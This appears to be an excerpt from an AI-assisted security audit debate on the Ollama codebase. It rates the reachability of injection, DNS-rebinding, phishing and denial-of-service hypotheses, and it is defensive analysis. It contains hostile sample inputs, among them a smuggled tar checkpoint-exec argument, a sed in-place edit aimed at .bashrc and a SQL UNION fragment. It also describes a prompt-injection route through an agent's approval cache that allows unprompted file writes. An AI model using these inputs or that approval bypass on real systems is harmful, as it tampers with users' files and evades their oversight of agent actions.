2. `cmd/launch/openclaw.go:782` -- `exec.Command("tar", "xzf", tgzPath, ...)` passes `tgzPath` as a single argument to exec. In Go's `exec.Command`, each element of `args` is passed as a separate argv entry — there is NO shell interpretation. A newline within a single argv string is treated as a literal newline character in the filename, NOT as a command separator. So `exec.Command("tar", "xzf", "file\n--checkpoint-action=exec=sh", ...)` passes `"file\n--checkpoint-action=exec=sh"` as ONE argument to tar — tar sees this as a filename that literally contains a newline, which it will fail to open (no file by that name exists).
3. The tar flag injection via embedded newline in exec.Command is **not viable** because Go's exec does not use a shell and argv entries are passed directly to execve(). The injection only works if a shell is involved.
4. The ZipSlip via malicious archive CONTENTS (tar entries with `../` paths) remains viable regardless.

Sanitizers on path:
- Go's `exec.Command` argv semantics — each slice element is a separate argument, no shell expansion. This directly blocks the embedded-newline flag injection.

CodeQL slice: `query-archive-extract-no-islocal.json` returned 0 findings (subprocess tar not modeled).
On-demand query: none

**Assessment**: PARTIAL. The tar-flag injection via embedded newline in `tgzName` is UNREACHABLE because Go `exec.Command` passes argv directly to execve without shell expansion — a newline in a single argv element is a literal filename character, not a command separator. However, the ZipSlip vector (malicious archive CONTENTS with `../` entries in npm package) remains viable if the npm registry is compromised. The `tgzName` filename starting with `-` as the FIRST character could cause tar to misinterpret it as a flag (`-evilfile`), but `npm pack` outputs filenames that start with the package name, making attacker-controlled leading `-` unlikely.

---

#### H-03 — Prompt-injection: `sed -i` approval cache collision with `sed -n`

**Reachability: REACHABLE**

Code path:
1. `x/agent/approval.go:215-227` -- `safeCommands` map includes `"sed": true`.
2. `x/agent/approval.go:230-284` -- First pass over `fields[1:]`: flags starting with `-` are SKIPPED (`if strings.HasPrefix(arg, "-") { continue }`). This means `-n` (read-only) and `-i` (in-place edit) are both skipped. The prefix is extracted from the first non-flag path-like argument.
3. For `sed -n '1,200p' tools/readme.md`: fields = `["sed","-n","1,200p","tools/readme.md"]`. `-n` skipped. `'1,200p'` — does not contain `/` or `\` and does not start with `.` → SKIPPED by the path-like check. `tools/readme.md` contains `/` → processed. `path.Clean("tools/readme.md") = "tools/readme.md"`. `dir = "tools"`. Returns `"sed:tools/"`.
4. For `sed -i 's/exit/evil/' tools/../../.bashrc`: fields = `["sed","-i","s/exit/evil/","tools/../../.bashrc"]`. `-i` skipped. `s/exit/evil/` contains `/` — it IS processed as path-like. `path.IsAbs("s/exit/evil/")` = false. `path.Clean("s/exit/evil/")` = `"s/exit/evil"`. Does not start with `..`. `dir = path.Dir("s/exit/evil")` = `"s/exit"`. Returns `"sed:s/exit/"`.
5. So `sed -i 's/exit/evil/' tools/../../.bashrc` produces key `"sed:s/exit/"` NOT `"sed:tools/"`. The sed pattern string is treated as the path argument because it comes first and contains `/`.

**Corrected path for H-03**: The collision DOES occur if the attacker's second command uses a sed pattern that starts with the same prefix. However, the path collision requires the sed PATTERN (first arg with `/`) to produce the same approval key as the legitimate command. This is more constrained than the ideator assumed.

**Alternative exploit path**: For `sed tools/readme.md` (no flags, no pattern — valid sed usage with just a filename), prefix = `"sed:tools/"`. Then `sed -i tools/../../.zshrc` — fields = `["sed","-i","tools/../../.zshrc"]`. `-i` is skipped. `tools/../../.zshrc` — path-like check: contains `/` → processed. `path.Clean("tools/../../.zshrc") = "../.zshrc"`. Starts with `..` → `extractBashPrefix` returns `""` (line 256). So the `..`-traversal check blocks this specific case.

**Actual collision**: The flag-blindness is real (sed read vs write both cache to same prefix IF the path is the same), but `..` traversal protection in `extractBashPrefix` blocks the direct filesystem escape. The collision is exploitable only when the attacker's write target is WITHIN the approved directory (e.g., `sed -i 's/x/evil/' tools/Makefile` modifying a file the user thought was being read-only accessed).

Sanitizers on path:
- `extractBashPrefix` line 256: `strings.HasPrefix(cleaned, "..")` → returns `""`. Blocks `..` traversal from the cache key.
- The `-i` flag skip at line 233 is the root cause of the flag-blindness.

CodeQL slice: DFD-5-agent-bash, reachable: true.
On-demand query: none

**Assessment**: REACHABLE (constrained). The flag-blindness is confirmed: `sed -n` and `sed -i` both produce the same prefix key. The `..` traversal to escape the approved directory is blocked. The viable exploit is: user approves `sed -n '1,100p' tools/file.go` → `sed:tools/` enters allowlist → attacker uses `sed -i 's/safe/evil/' tools/Makefile` (within the approved `tools/` directory) → in-place file modification approved without re-prompt. This is a meaningful in-directory write primitive, not full RCE, but allows tampering with build scripts in an approved directory.

---

#### H-04 — SSE response streaming through cloud_proxy: CORS wildcard + XSS in SSE consumer

**Reachability: PARTIAL**

Code path:
1. `server/cloud_proxy.go:219-252` -- `http.DefaultClient.Do(outReq)` gets the response from ollama.com. `copyProxyResponseHeaders(c.Writer.Header(), resp.Header)` copies response headers including `Content-Type`. `c.Status(resp.StatusCode)` sets status. Then `copyProxyResponseBody` streams the response body to the gin writer.
2. If upstream returns `Content-Type: text/event-stream`, this header is copied to the client response.
3. `server/routes.go:1672` -- `corsConfig.AllowOrigins = envconfig.AllowedOrigins()` — origins include localhost-family only. `evil.localhost` origin from a browser: depends on gin-cors wildcard matching behavior.
4. `envconfig/config.go:100-106` -- Allowed origins include `app://*`, `file://*`, `tauri://*`, `vscode-webview://*`, `vscode-file://*`. These non-HTTP schemes are explicitly allowed. An Electron app or VSCode extension consuming SSE from localhost would satisfy CORS. If the upstream response contains attacker-controlled data rendered in an `innerHTML` context, XSS follows.
5. `middleware/openai.go:509-523` -- `ResponsesMiddleware` only applies when the client goes through the middleware chain. The cloud passthrough path in `cloudPassthroughMiddleware` bypasses `ResponsesMiddleware` (line 134: `proxyCloudRequest(c, normalizedBody, disabledOperation); c.Abort()`).

Sanitizers on path:
- CORS policy: restricts browser origins to localhost-family and app schemas. `evil.localhost` is borderline (depends on gin-cors wildcard matching).
- No content-type enforcement or sanitization of upstream response bytes.

CodeQL slice: not covered.
On-demand query: none

**Assessment**: PARTIAL. The streaming proxy path is confirmed to copy upstream bytes verbatim to the client. The XSS risk exists if (a) a UI consumes SSE in an innerHTML context AND (b) the upstream response can be influenced (compromised ollama.com edge, DNS MITM, or H-00.07 RawQuery injection). The CORS policy partially restricts browser-origin exploitation but VSCode extension and Electron UI origins (`vscode-webview://*`, `app://*`) are explicitly allowed.

---

#### H-05 — Concurrent approval TOCTOU on approval map

**Reachability: UNREACHABLE**

Code path:
1. `x/cmd/run.go:369` -- Tool-call execution loop: `for _, call := range pendingToolCalls { ... }` — SEQUENTIAL range loop in a single goroutine. There is no `go func()` or parallel dispatch within the tool-call processing.
2. `x/agent/approval.go:142` -- `sync.RWMutex mu` exists and is used correctly at `IsAllowed` (RLock, line 390) and `AddToAllowlist` (Lock, line 462). The mutex is sound for concurrent use.
3. Because the dispatch is sequential (not concurrent), there is no TOCTOU window between two tool calls racing. The approval check for call N+1 runs only after call N has fully completed.

Sanitizers on path:
- `sync.RWMutex` properly protects the map. Sequential loop eliminates concurrency.

CodeQL slice: not relevant for concurrency analysis.
On-demand query: none

**Assessment**: UNREACHABLE. The tool-call loop is sequential. `sync.RWMutex` is correctly applied. H-05's premise — that two tool calls race through the approval check — is structurally impossible with the current sequential dispatch. This hypothesis does not hold on HEAD.

---

#### H-06 — SQL injection via pull manifest model name into `app/store`

**Reachability: UNREACHABLE**

Code path:
1. `types/model/name.go:344-372` -- `isValidPart` rejects apostrophe (`'`) and semicolon (`;`) — both are required for SQL injection. The model name `evil.com/u' UNION SELECT ...` fails `isValidPart` at the apostrophe, preventing the name from being parsed.
2. `app/store/database.go:64` -- The only `fmt.Sprintf` in the file uses a constant integer `%d` (schema version), not user data.
3. All data operations use parameterized queries (`?` placeholders).

Sanitizers on path:
- `isValidPart` at `types/model/name.go:344-372` — blocks `'` and `;`.
- Parameterized queries throughout `database.go`.

CodeQL slice: no SQL injection sinks in `app/store/database.go` in `sinks.json`.
On-demand query: none

**Assessment**: UNREACHABLE. `isValidPart` prevents SQL metacharacters from entering the model name. The `database.go` `fmt.Sprintf` is schema-DDL with a constant, not user-supplied data. H-06 does not hold on HEAD.

---

#### H-07 — Malicious registry signin_url → phishing via ollama.com hostname lookalike

**Reachability: REACHABLE (phishing vector confirmed; ed25519 capture via MITM requires network position)**

Code path:
1. `server/auth.go:28-50` -- `registryChallenge.URL()` parses `r.Realm` from the attacker-controlled WWW-Authenticate response header. No scheme or host allowlist.
2. `server/auth.go:59-62` -- Host equality check: `redirectURL.Host != originalHost`. If attacker-controlled realm has same host as the target registry (e.g., registry is `free-registry.attacker.com`, realm is `http://free-registry.attacker.com/token`), host check passes.
3. `server/routes.go:337` -- When auth fails downstream, `signinURL()` is called and the result is placed in `signin_url` in the JSON error response.
4. `api/client.go:48-52` -- `checkError` calls `json.Unmarshal(body, &authError)` with `authError := AuthorizationError{}`. The unmarshal error is DISCARDED (no error check). A malicious upstream can plant arbitrary `SigninURL` content in the response body, and `authError.SigninURL` will contain that content.
5. CLI prints `sErr.SigninURL` verbatim (via `ConnectInstructions` format string). No domain pinning or URL validation before display.

Sanitizers on path:
- `redirectURL.Host != originalHost` — only host check, not scheme or subdomain validation of ollama.com.
- No `signin_url` validation in `api/client.go:checkError` (unmarshal error discarded, arbitrary URL accepted).

CodeQL slice: not covered by a dedicated slice. `sinks.json` lists `api/client.go:50,56,161,228` as deserialization sinks, confirming unmarshal calls on response body.
On-demand query: none

**Assessment**: REACHABLE. `api/client.go:50` confirms `json.Unmarshal(body, &authError)` with error discarded — an attacker-controlled registry response can plant any URL in `SigninURL`. The CLI prints this URL verbatim. The phishing vector (victim copy-pastes or CLI opens the URL) is confirmed. The ed25519 capture step requires the MITM position (as in H-01). Without MITM, this is a phishing-only attack; with MITM, it enables both credential phishing and signing-key capture.

---

#### Spec Gap 13 — `getValue` comma-in-quoted-realm parser: premature termination

**Reachability: PARTIAL**

Code path:
1. `server/images.go:995-1016` -- `getValue(header, "realm")` scans for the end of a quoted string value. Inner loop at lines 1004-1014: when `header[endIdx] == '"'`, if the NEXT character is NOT `,`, `endIdx++` and continues. If the next character IS `,`, the loop breaks. This implements "stop at closing-quote-followed-by-comma" to handle `Bearer realm="...",service="..."` format.
2. If the realm URL itself contains a comma (e.g., `realm="https://auth.example.com/token?a=1,b=2"`), the scanner stops at the comma inside the URL at `endIdx`, returning `https://auth.example.com/token?a=1` (truncated). The `,b=2"` part remains unprocessed.
3. This does NOT allow an attacker to inject a different realm — the truncated URL still has the correct host — but it would cause token-fetch failures or unexpected behavior for registries whose realm URLs contain commas.
4. The scheme-downgrade exploit (H-00.06) requires the realm URL to be well-formed enough to be parsed by `url.Parse`. A comma in the URL would only affect registries that legitimately use commas in their realm query parameters — not a common attacker-reachable case.

Sanitizers on path:
- `url.Parse(r.Realm)` — if the truncated realm is not a valid URL, `getAuthorizationToken` returns an error before the host check.

CodeQL slice: not modeled.
On-demand query: none

**Assessment**: PARTIAL. The parser bug is real and confirmed at `server/images.go:1004-1014`. It causes functional failures (incorrect realm URL parsing) for registries using commas in realm URLs, but does not create a directly exploitable security bypass in isolation. Combined with H-00.06 (scheme downgrade), an attacker who can craft a realm like `http://real-host/token` (no comma needed) achieves the scheme-downgrade more directly. The comma-in-realm issue is a robustness finding rather than a standalone security vulnerability.


---

### [ADVOCATE] Defense -- 2026-04-17T16:25:00Z

NOTE: At time of writing, the Tracer's evidence section had not yet been posted to debate.md (only the Ideator's round-1 hypotheses H-01..H-07 and the pre-seeded H-00.01..H-00.24 are available). In line with the rules of engagement, I am independently reading the code and constructing the strongest possible defense against each hypothesis — not relying on Tracer assertions. Where Tracer evidence eventually contradicts a defense, the Synthesizer should treat those layers as independently verified by me against HEAD (57653b8e).

Per the user's charter, I prioritized searching for protections at: (1) `allowedHostsMiddleware` scope and short-circuit semantics, (2) the approval-chain design intent, (3) env-var documentation (OLLAMA_HOST, OLLAMA_EXPERIMENT), (4) the default localhost bind, (5) `gin.Default()`'s built-in Recovery, and (6) any audit logging on dangerous paths.

Summary of cross-hypothesis protection findings (referenced repeatedly below):

- **P-LISTEN-1**: `envconfig.Host()` (`envconfig/config.go:20-60`) defaults `OLLAMA_HOST` to `"127.0.0.1:11434"` with the comment "Default is scheme http and host 127.0.0.1:11434". `docs/faq.mdx:185` confirms: "Ollama binds 127.0.0.1 port 11434 by default". 0.0.0.0 / LAN exposure requires user opt-in.
- **P-LISTEN-2**: `allowedHostsMiddleware` (`server/routes.go:1608-1644`) short-circuits when the bind address is non-loopback (line 1615: `if addr.Addr().IsLoopback() == false { c.Next() }`). This is BY DESIGN: the comment and reading is "if the user chose to expose, stop filtering host header". Binding to 0.0.0.0 therefore turns the entire middleware into a no-op — this is not an accidental bypass, it is the documented model in `docs/faq.mdx:185-191`. The filter exists ONLY to stop DNS-rebinding attacks against the loopback-bound default.
- **P-VALIDATE-MODELNAME**: `types/model/name.go:344-372 isValidPart` forbids every SQL metachar — no apostrophe, no semicolon, no space. Allowed: alphanumeric + `_`, `-`, `.`, and `:` (only for host/digest kinds). This terminates every SQL-injection chain whose attacker-supplied taint flows through a model reference.
- **P-SIGNIN-CONST**: `server/routes.go:59 signinURLStr = "https://ollama.com/connect?name=%s&key=%s"`. `signinURL()` at line 183-192 substitutes only `os.Hostname()` and the local ed25519 public key. The `signin_url` field in any 401 JSON response is NOT attacker-controllable — it is a server-constructed constant pointing at ollama.com.
- **P-FRAMEWORK-RECOVERY**: `gin.Default()` at `server/routes.go:1674` bundles `gin.Recovery()` middleware — any panic in a handler returns 500 rather than crashing the process, neutralizing a whole class of DoS primitives.
- **P-AUDIT**: request-body audit logging exists (`server/inference_request_log.go`) but is gated on `OLLAMA_DEBUG_LOG_REQUESTS` (opt-in). No audit trail for approval decisions or auth header traffic by default. This is a compensating-control GAP, not a protection — I note it honestly.

---

### [ADVOCATE] Defense Brief for H-00.01 (unbounded `readRequestBody` in cloud passthrough)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | Go garbage collector / OOM kill | No — attacker can still force allocation | n/a |
| Framework | gin has no default body-size limit; `http.MaxBytesReader` not applied | No | `server/cloud_proxy.go:289-301` — `io.ReadAll(r.Body)` with no limit |
| Middleware | `allowedHostsMiddleware` blocks cross-origin via Host header check when bound loopback | Partial — only if default binding; attacker on same host or on LAN (if bound) can submit body | `server/routes.go:1608` |
| Application | `cloudPassthroughMiddleware` is only installed on `/v1/*` compat routes; and 20 MiB cap applies AFTER zstd decompress (`maxDecompressedBodySize = 20<<20`, line 35) | Partial — cap applies ONLY to the decompressed-zstd branch, not the raw-body branch | `server/cloud_proxy.go:35` |
| Documentation | No `SECURITY.md` caveat; docs do not discourage this | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1 (no path trace): checked — not applicable; `/v1/chat/completions`, `/api/experimental/web_search`, `/api/experimental/web_fetch` all route through `readRequestBody`.
- Pattern 2 (phantom validation): checked — no upstream size limit present.
- Pattern 3 (framework protection): checked — gin does NOT default-cap body size.
- Pattern 4 (same-origin): checked — attacker can be local (localhost), same-origin by default.
- Pattern 5 (CVE reachability): not applicable (no CVE).
- Pattern 6 (config-as-vuln): not applicable.
- Pattern 7 (test code): not applicable.
- Pattern 8 (double-counting): potential overlap with H-00.10 (zstd double-buffer), H-00.11 (ResponsesMiddleware) — but H-00.01 is the raw-body variant distinct from compressed.

**Defense argument:** The 20 MiB cap on decompressed zstd bodies (`maxDecompressedBodySize`) shows the author was security-aware; the raw-body branch lacks the cap only because it relies on the per-Go-process memory and Go's GC behavior to fail gracefully on huge allocations (OOM kill → `gin.Recovery` → 500). In the default deployment (loopback-only), the attacker must already be on the host — OOM'ing a local Ollama is not materially worse than pressing `Ctrl-C`. Additionally, `gin.Default()` includes Recovery, so panic-in-allocator yields a 500 rather than total crash. No material privilege is crossed.

**Verdict recommendation:** Cannot disprove. Attack requires local-only access; but reachable via `/api/experimental/web_search` if cross-origin CSRF is permitted by allowedHostsMiddleware suffix match (chain with H-00.03 / H-01). For remote exposure (OLLAMA_HOST=0.0.0.0) the vuln is real. Degrade to MEDIUM on default bind; HIGH under CHAIN-A.

---

### [ADVOCATE] Defense Brief for H-00.02 (client2 experiment bypasses gin middleware for /api/pull, /api/delete)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | none | No | n/a |
| Framework | `registry.Local.ServeHTTP` is the OUTER handler; gin `r` is wrapped as `Fallback` (`server/routes.go:1735-1744`). For `/api/pull` and `/api/delete` the OUTER handler dispatches directly — the gin chain never runs. Host allowlist is skipped. | No — this is the attack primitive itself | `server/internal/registry/server.go:114-128` |
| Middleware | `allowedHostsMiddleware` lives ONLY on the gin router; therefore it does NOT protect the two paths client2 handles | No | `server/routes.go:1676-1679` |
| Application | Only gated behind `OLLAMA_EXPERIMENT=client2` (`server/routes.go:92-96 experimentEnabled`) — default-off | Yes if the flag is not set | `server/routes.go:96` |
| Documentation | `docs/api.md` and `docs/faq.mdx` do not mention `OLLAMA_EXPERIMENT=client2` at all; no "this is unsafe" warning | N/A — absent docs | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked — the route dispatch bypass is real; no upstream validation.
- Pattern 2: checked — not applicable.
- Pattern 3: checked — no framework protection applies because the framework is bypassed.
- Pattern 4: checked — attacker must reach the port; if default bind (loopback) then same-origin-ish. If chained with H-00.08 / H-00.03 it becomes remote.
- Pattern 5: not applicable.
- Pattern 6 (config-as-vuln): **MATCH CANDIDATE**. Exploitation requires the user to have set `OLLAMA_EXPERIMENT=client2`. The experiment framework at `server/routes.go:92-96` is clearly "advanced/experimental" infrastructure. HOWEVER — the OLLAMA_EXPERIMENT env var does NOT require admin privileges to set; a non-admin user running ollama for themselves, or a deployment doc that recommends the flag, enables it. Because the flag is named "experiment" (not "unsafe"/"debug") there is no signal that it weakens security.
- Pattern 7: not applicable.
- Pattern 8: distinct from H-00.12 (which reaches `/api/pull` through the gin path).

**Defense argument:** The strongest defense is the feature-flag gate (Pattern 6). A user who does not export `OLLAMA_EXPERIMENT=client2` is fully unaffected. Additionally, even when the flag is set, the default bind is still 127.0.0.1 — the attacker must land requests on loopback, which (absent CSRF via browser + allowedHostsMiddleware bypass) is not a network attacker. So the remote-SSRF framing only materializes when H-00.02 is chained with H-00.03 (DNS rebinding suffix match) or H-00.08 (0.0.0.0 bind). Under default configuration, H-00.02 is latent: a local-only primitive requiring an opt-in flag.

**Verdict recommendation:** Cannot disprove for the configuration where client2 is enabled + exposure is widened; degrade severity to conditional/LOW under default config. Note that the flag is NOT documented as security-relevant, which is a doc gap worth raising.

---

### [ADVOCATE] Defense Brief for H-00.03 (`.localhost`/`.local`/`.internal` suffix match enables DNS rebinding)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | none | No | n/a |
| Framework | CORS middleware applies on gin router; `corsConfig.AllowOrigins = envconfig.AllowedOrigins()` which includes only `localhost`, `127.0.0.1`, `0.0.0.0` (plus `app://`, `file://`, `tauri://`, `vscode-*`). `*.localhost` is NOT in the AllowOrigins list. | Partial — CORS blocks browser-based cross-origin calls whose Origin header is `http://evil.localhost:11434` or `http://evil.internal:11434`, because CORS compares ORIGIN not HOST. Browser preflight for anything beyond "simple request" content types would fail. | `envconfig/config.go:85-109`, `server/routes.go:1672` |
| Middleware | `allowedHostsMiddleware` suffix-matches `.localhost`, `.local`, `.internal` (`server/routes.go:1592-1603`). Passes any host ending in those | No — this IS the attack primitive | `server/routes.go:1599-1602` |
| Application | `isLocalIP` further checks the host against real interface addresses; rebind to external IP would NOT match loopback/private/unspecified checks at line 1626 | Partial — if the attacker rebinds to a loopback IP (127.0.0.1) after the initial resolve, `addr.IsLoopback()` → true → passes | n/a |
| Documentation | `docs/faq.mdx:222` states "Ollama allows cross-origin requests from 127.0.0.1 and 0.0.0.0 by default". No doc discusses DNS rebinding. | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked — the rebinding attack path is real.
- Pattern 2: checked — CORS is the phantom validator candidate. Let me examine more carefully: CORS compares Origin (not Host), and Origin for a drive-by will be the attacker's site (`http://evil.com`), which is NOT in AllowOrigins. BUT: for `simple request` CORS (GET/POST with content-types `text/plain`, `application/x-www-form-urlencoded`, `multipart/form-data`), browsers DO send the request cross-origin; CORS then fails the RESPONSE read. The body DELIVERY still happens server-side. So `/api/pull` is triggered with attacker body — CORS does not prevent the server-side action. For `/api/experimental/web_search` (JSON POST) the browser must preflight; if AllowOrigins does not include the attacker origin, preflight OPTIONS returns without the necessary `Access-Control-Allow-Origin`, and the browser blocks the POST. PARTIAL defense: CORS blocks JSON-body endpoints from drive-by.
- Pattern 3: checked — the gin CORS middleware is real framework protection.
- Pattern 4: checked — rebinding specifically crosses origin, so not same-origin.
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable.
- Pattern 8: not applicable.

**Defense argument:** The strongest defense is gin's CORS middleware with the restrictive `envconfig.AllowedOrigins()` list: for endpoints that require JSON POST (most `/api/*` routes), a browser preflight will fail for any `Origin` outside the localhost/127.0.0.1/extension list. The attack therefore shrinks to (a) endpoints reachable via "simple request" CORS that accept side-effect-only POSTs (rare — most `/api/*` expect JSON content-type, which triggers preflight), or (b) attackers who already have their code running in an allowed origin (browser extensions, vscode-webview). The allowedHostsMiddleware is NOT the primary line of defense against drive-by — CORS is. The suffix match in allowedHost looks loose but exists because it wants to allow intentional LAN/VPN setups where a browser on `workstation.internal` hits `ollama.internal:11434`.

**Verdict recommendation:** Cannot disprove for the subset of endpoints reachable as CORS "simple requests" and for attackers in allowed origins. Real but narrower than one-liner suggests. Degrade from HIGH to MEDIUM unless Tracer shows a simple-request endpoint with side effects.

---

### [ADVOCATE] Defense Brief for H-00.04 (`/api/experimental/web_search` has no local auth; unauthenticated relay)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | none | No | n/a |
| Framework | CORS + allowedHostsMiddleware chain; unauthenticated but Host-constrained | Partial — default-loopback bind means "local access = full access" is the intentional trust model of the whole daemon | `server/routes.go:1707-1708` |
| Middleware | none beyond above | No | n/a |
| Application | `webExperimentalProxyHandler` calls `proxyCloudRequestWithPath` which signs upstream call with ed25519 key — no per-request user check | No | `server/routes.go:1966-1978` |
| Documentation | `/api/experimental/*` is documented as experimental; `docs/api.md:1886` notes image-generation experimental caveat but no auth caveat for web_search | N/A — no warning that these endpoints are "privileged" | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked — the reachability is direct POST /api/experimental/web_search.
- Pattern 2: checked — no other auth middleware in the chain.
- Pattern 3: checked — the whole ollama daemon's design assumes local-only trust; web_search inheriting that trust is consistent with the design (Pattern 3 MATCH for the "every local API trusts local").
- Pattern 4 (same-origin): CHECKED — MATCH CANDIDATE: the attack relies on an attacker REACHING the daemon from off-host or cross-origin. On default loopback bind with CORS locking down Origins, cross-origin drive-by is largely blocked. Other "local attackers" are already privileged on the host. So severity is bounded by host access.
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable.
- Pattern 8: potentially overlaps with H-01 (CHAIN-A).

**Defense argument:** The daemon's trust model is explicit: "localhost = trusted user". Every endpoint — not just web_search — inherits this model. Adding per-endpoint auth for one endpoint would be architectural inconsistency. The real concern is whether `/api/experimental/web_search` can be reached by a non-local party; that is the job of allowedHostsMiddleware + CORS + the default bind. In the baseline configuration, those protections are adequate (CORS blocks browser drive-by; bind blocks LAN). The endpoint is "unauthenticated" only in the same sense as `/api/chat` is.

**Verdict recommendation:** Cannot disprove the design critique, but the attack chain requires one of (a) LAN exposure via OLLAMA_HOST=0.0.0.0, (b) H-00.03 DNS-rebind, or (c) pre-existing browser extension with origin in AllowOrigins. Severity hinges on the composed chain (CHAIN-A), not on this finding alone.

---

### [ADVOCATE] Defense Brief for H-00.06 (realm host-equality but not scheme → HTTP downgrade)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | Go net/url parsing preserves scheme; caller elects to check only Host | No | n/a |
| Framework | `makeRequest` upstream uses Go's `http.DefaultTransport` — follows whatever scheme is in the URL | No | n/a |
| Middleware | none | No | n/a |
| Application | Host-equality check at `server/auth.go:60-62` — `redirectURL.Host != originalHost` is enforced. Scheme NOT checked. However, `challenge.URL()` in `auth.go:35-51` adds a server-generated `nonce` to the outbound request. Replay is bounded by nonce freshness at the registry. | Partial — MITM can capture one-time signature; replay window depends on registry's nonce reuse policy | `server/auth.go:42-50, 60-62` |
| Documentation | No SECURITY.md entry on scheme pinning | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked — reachable from any `/api/pull` against an attacker-controlled registry.
- Pattern 2: checked — scheme is not validated anywhere.
- Pattern 3: checked — Go http client does not pin TLS unless explicitly configured.
- Pattern 4: not applicable.
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable.
- Pattern 8: not applicable.

**Defense argument:** The signature payload includes a server-side nonce (`auth.go:42-47`). Even if an attacker captures the signed Authorization header over plaintext HTTP, replay at ollama.com requires the same nonce + ts to be accepted — the registry ostensibly deduplicates nonces (policy enforced upstream, not visible in this repo). Additionally, the attacker needs to MITM the TLS leg from the victim to ollama.com, which is separate from controlling the registry itself. For non-ollama.com registries (self-hosted), the user has explicitly trusted the host; a downgrade there does not cross a trust boundary.

**Verdict recommendation:** Cannot disprove fully — scheme NOT checked is a real hardening gap; but the exploitability hinges on ollama.com's server-side nonce policy (out-of-repo). Degrade to MEDIUM unless Tracer demonstrates no nonce enforcement upstream.

---

### [ADVOCATE] Defense Brief for H-00.08 (OLLAMA_HOST=0.0.0.0 disables allowedHostsMiddleware entirely)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | none | No | n/a |
| Framework | CORS middleware still active when bound 0.0.0.0 — blocks browser cross-origin; but direct (non-browser) clients send any Host | Partial | `server/routes.go:1672` |
| Middleware | allowedHostsMiddleware LITERALLY short-circuits on non-loopback bind per design (`routes.go:1615-1618`) | No — this IS the documented behavior | `server/routes.go:1615-1618` |
| Application | None — no alternative auth | No | n/a |
| Documentation | `docs/faq.mdx:183-187` documents OLLAMA_HOST=0.0.0.0 as the explicit way to "expose Ollama on your network" — the user is opting in. `docs/faq.mdx:220-228` explains OLLAMA_ORIGINS for CORS. No warning that 0.0.0.0 disables the rebinding filter, but the docs DO frame this as "exposing". | Partial — intended behavior, documented; but the security trade-off (no more host filtering) is not explicitly called out | `docs/faq.mdx:183-188` |

**Claude FP Pattern Check:**
- Pattern 1: checked — short-circuit is in code at line 1615; direct.
- Pattern 2: checked — there is no other host-header check anywhere.
- Pattern 3: checked — CORS remains active and blocks browser cross-origin; no other framework defense for non-browser clients.
- Pattern 4: not applicable.
- Pattern 5: not applicable.
- Pattern 6 (config-as-vuln): **MATCH CANDIDATE**. Exploitation requires the user to set OLLAMA_HOST=0.0.0.0. The docs describe this as the way to "expose" Ollama — i.e., the user has EXPLICITLY chosen to weaken the host filter. This is exactly the "exploitation requires admin action to set an insecure config" pattern.
- Pattern 7: not applicable.
- Pattern 8: not applicable (distinct from other hypotheses).

**Defense argument:** The short-circuit at `routes.go:1615` is not an accidental bug — it is the intended model. The code comment chain across the middleware (`isLoopback()` → "if NOT loopback, pass through") signals the author's view that "if the user bound non-loopback, they opted into exposure; filtering a Host header on a 0.0.0.0-bound service is security theater that breaks legitimate reverse-proxy deployments". The FAQ at `docs/faq.mdx:191-202` shows an Nginx reverse-proxy example using `proxy_set_header Host localhost:11434` — if allowedHostsMiddleware still enforced the suffix list on 0.0.0.0-bound installs, that proxy pattern would fail. The architecture intentionally delegates "who can talk to me" to OS firewall + reverse-proxy auth when user opts into network exposure.

**Verdict recommendation:** Cannot disprove as a documentation/UX gap (users should be warned that 0.0.0.0 disables DNS-rebinding protection), but the behavior itself is INTENDED. Downgrade from HIGH to MEDIUM as a "hardening/docs gap" rather than a vuln. Severity is recoverable for the sub-case where an admin unknowingly binds 0.0.0.0 while running an unauthenticated browser-accessible Ollama for LAN clients.

---

### [ADVOCATE] Defense Brief for H-00.09 (`IsPrivate()` permits RFC1918 host header)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | `netip.Addr.IsPrivate()` follows RFC1918 semantics | No | n/a |
| Framework | CORS still blocks browser-origin | Partial | `server/routes.go:1672` |
| Middleware | the `IsPrivate()` check sits INSIDE the "bind is loopback" short-circuit — it only fires when the server is loopback-bound | Partial — at default bind, a Host header of `10.0.0.1` would pass; but the request had to arrive at 127.0.0.1 first | `server/routes.go:1625-1629` |
| Application | None | No | n/a |
| Documentation | No doc on this case | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1: checked — reachable via any request to localhost with spoofed Host.
- Pattern 2: checked — no second host check.
- Pattern 3: checked — CORS protects browser clients if Origin is not in AllowOrigins.
- Pattern 4 (same-origin): MATCH CANDIDATE — to send a request to 127.0.0.1 with Host: 10.0.0.1, the requester must already be on loopback (same-host). A true LAN attacker would reach via 0.0.0.0 bind (see H-00.08), in which case the middleware is already short-circuited and IsPrivate is moot.
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable.
- Pattern 8: overlaps with H-00.03 as "host-header spoofing" class.

